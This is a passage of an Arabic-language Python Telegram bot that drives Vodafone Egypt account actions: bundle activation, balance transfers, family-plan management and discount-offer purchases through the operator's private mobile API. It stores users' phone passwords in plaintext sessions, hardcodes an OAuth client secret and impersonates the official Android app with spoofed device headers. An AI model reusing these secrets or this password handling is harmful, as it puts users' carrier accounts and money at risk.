        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب باقات اكستريم...*", parse_mode='Markdown')
    
    auth_result = extreme_login(phone, password)
    if not auth_result['success']:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
        return
    
    token = auth_result['token']
    data = get_extreme_packages(token, phone)
    if not data:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب الباقات!*", parse_mode='Markdown')
        return
    
    packages = parse_extreme_packages(data)
    if not packages:
        user_bot.send_message(user_id, f"{EMOJI['error']} *لا توجد باقات اكستريم متاحة*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'packages': packages,
        'token': token,
        'phone': phone,
        'action': 'extreme_waiting_bundle'
    }
    
    user_bot.send_message(
        user_id,
        f"{EMOJI['extreme']} *اختر الباقة المناسبة:*",
        parse_mode='Markdown',
        reply_markup=show_extreme_packages_markup(packages)
    )

def handle_apps_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب باقات التطبيقات...*", parse_mode='Markdown')
    
    auth_result = apps_login(phone, password)
    if not auth_result['success']:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
        return
    
    token = auth_result['token']
    data = get_apps_packages(token, phone)
    if not data:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب الباقات!*", parse_mode='Markdown')
        return
    
    packages = parse_apps_packages(data)
    if not packages:
        user_bot.send_message(user_id, f"{EMOJI['error']} *لا توجد باقات تطبيقات متاحة*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'packages': packages,
        'token': token,
        'phone': phone,
        'action': 'apps_waiting_bundle'
    }
    
    user_bot.send_message(
        user_id,
        f"{EMOJI['apps']} *اختر الباقة المناسبة:*",
        parse_mode='Markdown',
        reply_markup=show_apps_packages_markup(packages)
    )

# ==================== دوال الخدمات الجديدة ====================

def handle_transfer_balance_service(user_id):
    """خدمة تحويل الرصيد - المرحلة الأولى (طلب رقم المستلم والمبلغ)"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'transfer_waiting_receiver',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['transfer_balance']} *تحويل رصيد*\n\n📱 رقم المرسل: `{session['phone']}`\n\n📱 *أدخل رقم المستلم:*",
        parse_mode='Markdown'
    )

def handle_transfer_receiver(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'transfer_waiting_receiver':
        return
    
    receiver_num = re.sub(r'[^0-9]', '', message.text.strip())
    if len(receiver_num) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id]['receiver_num'] = receiver_num
    bot_status['user_data'][user_id]['action'] = 'transfer_waiting_amount'
    user_bot.send_message(
        user_id,
        f"{EMOJI['info']} *أدخل المبلغ المراد تحويله (بالجنيه):*",
        parse_mode='Markdown'
    )

def handle_transfer_amount(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'transfer_waiting_amount':
        return
    
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *المبلغ يجب أن يكون أكبر من صفر!*", parse_mode='Markdown')
            return
    except ValueError:
        user_bot.send_message(user_id, f"{EMOJI['error']} *يرجى إدخال مبلغ صحيح!*", parse_mode='Markdown')
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    receiver_num = user_data.get('receiver_num')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري إرسال كود التأكيد...*", parse_mode='Markdown')
    
    success, message = run_transfer_balance(phone, password, receiver_num, amount)
    
    if success:
        bot_status['user_data'][user_id]['amount'] = amount
        bot_status['user_data'][user_id]['action'] = 'transfer_waiting_otp'
        user_bot.send_message(
            user_id,
            f"{EMOJI['success']} {message}\n\n✍️ *أدخل الكود المرسل:*",
            parse_mode='Markdown'
        )
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
        del bot_status['user_data'][user_id]

def handle_transfer_otp(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'transfer_waiting_otp':
        return
    
    otp_code = message.text.strip()
    if not otp_code:
        user_bot.send_message(user_id, f"{EMOJI['error']} *الرجاء إدخال الكود!*", parse_mode='Markdown')
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    receiver_num = user_data.get('receiver_num')
    amount = user_data.get('amount')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تأكيد التحويل...*", parse_mode='Markdown')
    
    success, message = run_confirm_transfer(phone, password, receiver_num, amount, otp_code)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

# ==================== دوال خدمات الفاميلي ====================

def handle_send_invite_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'send_invite_waiting_member',
        'owner_num': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['send_invite']} *ارسال دعوة*\n\n📱 رقم الأونر (المسجل): `{session['phone']}`\n\n📱 *أدخل رقم الفرد (المستقبل):*",
        parse_mode='Markdown'
    )

def handle_send_invite_member(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'send_invite_waiting_member':
        return
    
    member_num = re.sub(r'[^0-9]', '', message.text.strip())
    if len(member_num) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id]['member_num'] = member_num
    bot_status['user_data'][user_id]['action'] = 'send_invite_waiting_percent'
    user_bot.send_message(user_id, f"{EMOJI['info']} *اختر نسبة التوزيع:*", parse_mode='Markdown', reply_markup=get_percentage_markup())

def handle_send_invite_percent(call, user_id, percent):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'send_invite_waiting_percent':
        return
    
    owner_num = user_data.get('owner_num')
    member_num = user_data.get('member_num')
    password = user_data.get('password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري إرسال الدعوة...*", parse_mode='Markdown')
    
    auth_result = get_authorization(owner_num, password)
    if auth_result['success']:
        token = auth_result['bearer_token']
        result = addMember(owner_num, member_num, token, percent)
        if result['success']:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم إرسال الدعوة بنجاح!*\n\n📱 الأونر: `{owner_num}`\n📱 الفرد: `{member_num}`\n📊 النسبة: {percent}%", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل إرسال الدعوة!*\n{result['message']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_accept_invite_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'accept_invite_waiting_owner',
        'member_num': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['accept_invite']} *قبول دعوة*\n\n📱 رقم الفرد (المسجل): `{session['phone']}`\n\n📱 *أدخل رقم الأونر (المرسل):*",
        parse_mode='Markdown'
    )

def handle_accept_invite_owner(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'accept_invite_waiting_owner':
        return
    
    owner_num = re.sub(r'[^0-9]', '', message.text.strip())
    if len(owner_num) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    member_num = user_data.get('member_num')
    password = user_data.get('password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري قبول الدعوة...*", parse_mode='Markdown')
    
    auth_result = get_authorization(member_num, password)
    if auth_result['success']:
        token = auth_result['bearer_token']
        result = accept_invitation(owner_num, member_num, token)
        if result['success']:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم قبول الدعوة بنجاح!*\n\n📱 الأونر: `{owner_num}`\n📱 الفرد: `{member_num}`", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل قبول الدعوة!*\n{result['message']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_delete_member_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'delete_member_waiting_member',
        'owner_num': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['delete_member']} *حذف فرد*\n\n📱 رقم الأونر (المسجل): `{session['phone']}`\n\n📱 *أدخل رقم الفرد المراد حذفه:*",
        parse_mode='Markdown'
    )

def handle_delete_member_member(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'delete_member_waiting_member':
        return
    
    member_num = re.sub(r'[^0-9]', '', message.text.strip())
    if len(member_num) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    owner_num = user_data.get('owner_num')
    password = user_data.get('password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري حذف العضو...*", parse_mode='Markdown')
    
    auth_result = get_authorization(owner_num, password)
    if auth_result['success']:
        token = auth_result['bearer_token']
        result = remove_member(owner_num, token, member_num)
        if result['success']:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم حذف العضو بنجاح!*\n\n📱 الأونر: `{owner_num}`\n📱 الفرد المحذوف: `{member_num}`", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل حذف العضو!*\n{result['message']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_change_percent_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'change_percent_waiting_member',
        'owner_num': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['change_percent']} *تغيير النسبة*\n\n📱 رقم الأونر (المسجل): `{session['phone']}`\n\n📱 *أدخل رقم الفرد المراد تغيير نسبته:*",
        parse_mode='Markdown'
    )

def handle_change_percent_member(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'change_percent_waiting_member':
        return
    
    member_num = re.sub(r'[^0-9]', '', message.text.strip())
    if len(member_num) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id]['member_num'] = member_num
    bot_status['user_data'][user_id]['action'] = 'change_percent_waiting_percent'
    user_bot.send_message(user_id, f"{EMOJI['info']} *اختر النسبة الجديدة:*", parse_mode='Markdown', reply_markup=get_percentage_markup())

def handle_change_percent_percent(call, user_id, percent):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'change_percent_waiting_percent':
        return
    
    owner_num = user_data.get('owner_num')
    member_num = user_data.get('member_num')
    password = user_data.get('password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تغيير النسبة...*", parse_mode='Markdown')
    
    auth_result = get_authorization(owner_num, password)
    if auth_result['success']:
        token = auth_result['bearer_token']
        result = change_quota(owner_num, token, member_num, percent)
        if result['success']:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم تغيير النسبة بنجاح!*\n\n📱 الأونر: `{owner_num}`\n📱 الفرد: `{member_num}`\n📊 النسبة الجديدة: {percent}%", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تغيير النسبة!*\n{result['message']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_owner_percent_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب النسبة...*", parse_mode='Markdown')
    
    auth_result = get_authorization(phone, password)
    if auth_result['success']:
        token = auth_result['bearer_token']
        result = get_owner_flex(token, phone)
        if result['success']:
            flex_amount = result['flex']
            if flex_amount < 1000:
                status = "⚠️ منخفضة! يرجى إعادة الشحن قريباً"
            elif flex_amount < 3000:
                status = "📊 متوسطة"
            elif flex_amount < 5000:
                status = "👍 جيدة"
            else:
                status = "✨ ممتازة!"
            user_bot.send_message(user_id, f"{EMOJI['owner_percent']} *نسبة فليكس الأونر*\n\n📱 الرقم: `{phone}`\n💪 نسبة الفليكس: *{flex_amount}* فليكس\n📊 التقييم: {status}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب النسبة!*\n{result['message']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')

def handle_get_owner_number_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري البحث عن الأونر...*", parse_mode='Markdown')
    
    auth_result = get_authorization(phone, password)
    if auth_result['success']:
        token = auth_result['bearer_token']
        result = get_owner_number(phone, token)
        if result['success']:
            user_bot.send_message(user_id, f"{EMOJI['owner_number']} *رقم الأونر*\n\n📱 رقم الفرد: `{phone}`\n👤 رقم الأونر: `{result['owner']}`", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل البحث عن الأونر!*\n{result['message']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')

# ==================== دوال اختيار الباقات ====================

def handle_flex_bundle_selection(call, user_id, bundle_number):
    user_data = bot_status['user_data'].get(user_id, {})
    phone = user_data.get('phone')
    password = user_data.get('password')
    bundle = get_flex_bundle_by_number(bundle_number)
    
    if not bundle:
        user_bot.send_message(user_id, f"{EMOJI['error']} *حدث خطأ في اختيار الباقة*", parse_mode='Markdown')
        del bot_status['user_data'][user_id]
        return
    
    # عرض تأكيد قبل التفعيل
    bot_status['user_data'][user_id]['pending_bundle'] = bundle_number
    bot_status['user_data'][user_id]['action'] = 'flex_bundle_confirm'
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"✅ تأكيد التفعيل", callback_data=f"flex_bundle_confirm_{bundle_number}"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.answer_callback_query(call.id)
    user_bot.send_message(
        user_id,
        f"{EMOJI['flex']} *تأكيد تفعيل الباقة*\n\n📱 الرقم: `{phone}`\n📦 الباقة: *{bundle['name']}*\n💰 السعر: *{bundle['price']} جنيه*\n\nهل تريد تفعيل هذه الباقة؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def execute_flex_bundle(call, user_id, bundle_number):
    """تنفيذ تفعيل باقة فليكس بعد التأكيد"""
    user_data = bot_status['user_data'].get(user_id, {})
    phone = user_data.get('phone')
    password = user_data.get('password')
    bundle = get_flex_bundle_by_number(bundle_number)
    
    if not bundle:
        user_bot.answer_callback_query(call.id, "حدث خطأ في الباقة")
        return
    
    user_bot.answer_callback_query(call.id, f"جاري تفعيل {bundle['name']}...")
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل {bundle['name']}...*", parse_mode='Markdown')
    
    success, message = run_flex_activation(phone, password, bundle_number)
    
    if success:
        user_bot.send_message(user_id, message, parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, message, parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

def handle_note_package_selection(call, user_id, package_number):
    user_data = bot_status['user_data'].get(user_id, {})
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري الاشتراك...*", parse_mode='Markdown')
    
    success, message = run_note_activation(phone, password, package_number)
    
    if success:
        user_bot.send_message(user_id, message, parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, message, parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_plus_package_selection(call, user_id, package_index):
    user_data = bot_status['user_data'].get(user_id, {})
    packages = user_data.get('packages', [])
    token = user_data.get('token')
    phone = user_data.get('phone')
    
    selected_package = None
    for pkg in packages:
        if pkg['index'] == int(package_index):
            selected_package = pkg
            break
    
    if not selected_package:
        user_bot.send_message(user_id, f"{EMOJI['error']} *حدث خطأ في اختيار الباقة*", parse_mode='Markdown')
        del bot_status['user_data'][user_id]
        return
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل {selected_package['name']}...*", parse_mode='Markdown')
    
    result = activate_plus_package(token, phone, selected_package)
    
    if result['success']:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم تفعيل الباقة بنجاح!*\n\n📱 الرقم: `{phone}`\n📦 اسم الباقة: {selected_package['name']}\n💰 السعر: {selected_package['price']} جنيه\n💾 البيانات: {selected_package['quota']}\n⏱️ المدة: {selected_package['duration']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تفعيل الباقة!*\n{result['message']}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_extreme_package_selection(call, user_id, package_index):
    user_data = bot_status['user_data'].get(user_id, {})
    packages = user_data.get('packages', [])
    token = user_data.get('token')
    phone = user_data.get('phone')
    
    selected_package = None
    for pkg in packages:
        if pkg['index'] == int(package_index):
            selected_package = pkg
            break
    
    if not selected_package:
        user_bot.send_message(user_id, f"{EMOJI['error']} *حدث خطأ في اختيار الباقة*", parse_mode='Markdown')
        del bot_status['user_data'][user_id]
        return
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل {selected_package['name']}...*", parse_mode='Markdown')
    
    result = activate_extreme_package(token, phone, selected_package)
    
    if result['success']:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم تفعيل الباقة بنجاح!*\n\n📱 الرقم: `{phone}`\n📦 اسم الباقة: {selected_package['name']}\n💰 السعر: {selected_package['price']} جنيه\n💾 البيانات: {selected_package['quota']}\n⏱️ المدة: {selected_package['duration']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تفعيل الباقة!*\n{result['message']}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_apps_package_selection(call, user_id, package_index):
    user_data = bot_status['user_data'].get(user_id, {})
    packages = user_data.get('packages', [])
    token = user_data.get('token')
    phone = user_data.get('phone')
    
    selected_package = None
    for pkg in packages:
        if pkg['index'] == int(package_index):
            selected_package = pkg
            break
    
    if not selected_package:
        user_bot.send_message(user_id, f"{EMOJI['error']} *حدث خطأ في اختيار الباقة*", parse_mode='Markdown')
        del bot_status['user_data'][user_id]
        return
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل {selected_package['name']}...*", parse_mode='Markdown')
    
    result = activate_apps_package(token, phone, selected_package)
    
    if result['success']:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم تفعيل الباقة بنجاح!*\n\n📱 الرقم: `{phone}`\n📦 اسم الباقة: {selected_package['name']}\n📱 التطبيق: {selected_package['app_name']}\n💰 السعر: {selected_package['price']} جنيه\n💾 البيانات: {selected_package['quota']}\n⏱️ المدة: {selected_package['duration']}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تفعيل الباقة!*\n{result['message']}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

# ==================== فئة خصم فليكس (موجودة سابقاً) ====================
class VodafoneDiscountAuto:
    def __init__(self):
        self.session = requests.Session()
        self.token = None
        self.phone = None
        
    def login(self, phone: str, password: str) -> bool:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': phone,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/x-www-form-urlencoded",
            'silentLogin': "true",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'digitalId': "25VT5Q5QWG8DK",
            'device-id': "b26ba335813fad21"
        }
        try:
            response = self.session.post(url, data=payload, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('access_token')
                self.phone = phone
                if self.token:
                    return True
            return False
        except Exception:
            return False
    
    def get_discount_offers(self) -> List[Dict]:
        if not self.token:
            return []
        url = f"https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering"
        params = {
            'customerAccountId': self.phone,
            'parts.customerAccount.type': "Consumer",
            'Accept-Language': "ar",
            'type': "Tarrifs"
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "EligibleProductOfferingHost",
            'useCase': "Tarrifs",
            'Authorization': f"Bearer {self.token}",
            'api-version': "v2",
            'device-id': "b26ba335813fad21",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'msisdn': self.phone,
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }
        try:
            response = self.session.get(url, params=params, headers=headers, timeout=30)
            if response.status_code == 200:
                return response.json()
            return []
        except Exception:
            return []
    
    def extract_price_from_desc(self, description: str) -> Optional[Dict]:
        try:
            patterns = [
                r'جدد ب(\d+) بدل (\d+)',
                r'ب(\d+) بدل (\d+)',
                r'بسعر (\d+) بدل (\d+)',
                r'و جدد ب(\d+) بدل (\d+)',
                r'خصم (\d+) بدل (\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, description)
                if match:
                    discounted = int(match.group(1))
                    original = int(match.group(2))
                    if original > 0:
                        discount_percentage = ((original - discounted) / original) * 100
                    else:
                        discount_percentage = 0
                    return {
                        'original': original,
                        'discounted': discounted,
                        'discount_percentage': discount_percentage
                    }
            return None
        except:
            return None
    
    def extract_bundle_name(self, name: str, description: str) -> str:
        patterns = [r'فليكس (\d+)', r'باقة (\d+)', r'على (\d+)', r'في (\d+)']
        for pattern in patterns:
            match = re.search(pattern, description)
            if match:
                return f"فليكس {match.group(1)}"
        if name:
            return name
        elif 'فليكس' in description:
            return "فليكس"
        else:
            return "الباقة الحالية"
    
    def extract_tariff_id(self, line_item: Dict) -> str:
        characteristics = line_item.get('characteristic', {})
        values = characteristics.get('characteristicsValue', [])
        for char in values:
            if isinstance(char, dict) and char.get('characteristicName') == 'TariffID':
                return char.get('value', '')
        return ''
    
    def extract_product_id(self, line_item: Dict) -> str:
        characteristics = line_item.get('characteristic', {})
        values = characteristics.get('characteristicsValue', [])
        for char in values:
            if isinstance(char, dict) and char.get('characteristicName') == 'TibcoID':
                return char.get('value', '')
        return ''
    
    def extract_tariff_rank(self, line_item: Dict) -> str:
        categories = line_item.get('category', [])
        for cat in categories:
            if isinstance(cat, dict) and cat.get('listHierarchyId') == 'TariffRank':
                return cat.get('value', '')
        return '1'
    
    def extract_offer_rank(self, line_item: Dict) -> str:
        characteristics = line_item.get('characteristic', {})
        values = characteristics.get('characteristicsValue', [])
        for char in values:
            if isinstance(char, dict) and char.get('characteristicName') == 'OfferRank':
                return char.get('value', '')
        return '1'
    
    def extract_cohort_id(self, line_item: Dict) -> str:
        characteristics = line_item.get('characteristic', {})
        values = characteristics.get('characteristicsValue', [])
        for char in values:
            if isinstance(char, dict) and char.get('characteristicName') == 'CohortId':
                return char.get('value', '')
        return '30'
    
    def extract_all_discount_offers(self, offers_data: List) -> List[Dict]:
        all_offers = []
        if not offers_data:
            return all_offers
        
        for offer_group in offers_data:
            if not isinstance(offer_group, dict):
                continue
            parts = offer_group.get('parts', {})
            if not parts:
                continue
            product_offerings = parts.get('productOffering', [])
            if not isinstance(product_offerings, list):
                continue
            
            for product in product_offerings:
                line_items = product.get('lineItem', [])
                if not isinstance(line_items, list):
                    continue
                
                for line_item in line_items:
                    if not isinstance(line_item, dict):
                        continue
                    
                    offer_type = line_item.get('type', '')
                    description = line_item.get('desc', '')
                    name = line_item.get('name', '')
                    
                    is_discount_offer = (
                        offer_type in ['Access fees Discount', 'Usage fees Discount'] and
                        any(keyword in description for keyword in ['جدد', 'خصم', 'بدل', 'خليك'])
                    )
                    
                    if is_discount_offer:
                        price_info = self.extract_price_from_desc(description)
                        if price_info:
                            bundle_name = self.extract_bundle_name(name, description)
                            tariff_id = self.extract_tariff_id(line_item)
                            product_id = self.extract_product_id(line_item)
                            
                            if not tariff_id or not product_id:
                                continue
                            
                            offer_details = {
                                'name': name,
                                'bundle_name': bundle_name,
                                'desc': description,
                                'original_price': price_info['original'],
                                'discounted_price': price_info['discounted'],
                                'discount_amount': price_info['original'] - price_info['discounted'],
                                'discount_percentage': price_info['discount_percentage'],
                                'type': offer_type,
                                'tariff_id': tariff_id,
                                'product_id': product_id,
                                'tariff_rank': self.extract_tariff_rank(line_item),
                                'offer_rank': self.extract_offer_rank(line_item),
                                'cohort_id': self.extract_cohort_id(line_item),
                                'is_half_price': price_info['discount_percentage'] >= 45
                            }
                            all_offers.append(offer_details)
        
        if all_offers:
            half_price_offers = [o for o in all_offers if o['is_half_price']]
            other_offers = [o for o in all_offers if not o['is_half_price']]
            half_price_offers.sort(key=lambda x: x['discount_percentage'], reverse=True)
            other_offers.sort(key=lambda x: x['discount_percentage'], reverse=True)
            return half_price_offers + other_offers
        
        return all_offers
    
    def purchase_offer(self, offer: Dict) -> Tuple[bool, str]:
        if not offer.get('product_id') or not offer.get('tariff_id'):
            return False, "❌ بيانات العرض غير مكتملة"
        
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        
        payload = {
            "channel": {"name": "MobileApp"},
            "orderItem": [{
                "action": "add",
                "id": offer['product_id'],
                "itemPrice": [
                    {
                        "name": "OriginalPrice",
                        "price": {
                            "taxIncludedAmount": {
                                "unit": "LE",
                                "value": str(offer['discounted_price'])
                            }
                        }
                    },
                    {
                        "name": "MigrationFees",
                        "price": {
                            "taxIncludedAmount": {
